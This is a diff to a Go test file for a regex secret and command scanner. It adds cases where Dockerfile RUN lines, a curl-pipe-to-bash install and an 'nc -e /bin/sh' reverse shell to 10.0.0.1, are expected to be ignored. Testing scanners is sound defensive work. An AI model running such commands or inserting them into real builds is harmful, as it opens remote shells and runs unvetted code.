@@ -77,6 +77,16 @@ func TestRegexScanner_Scan(t *testing.T) {
 			content:     "key = \"AKIAIOSFODNN7EXAMPLE\"",
 			wantFinding: "AWS Access Key",
 		},
+		{
+			name:        "Dockerfile RUN pipe (Should Ignore due to cmdPrefix)",
+			content:     "RUN curl -fsS https://cursor.com/install | bash",
+			wantFinding: "",
+		},
+		{
+			name:        "Dockerfile RUN nc -e (Should Ignore due to cmdPrefix)",
+			content:     "RUN nc -e /bin/sh 10.0.0.1 1234",
+			wantFinding: "",
+		},
 	}
 
 	for _, tt := range tests {
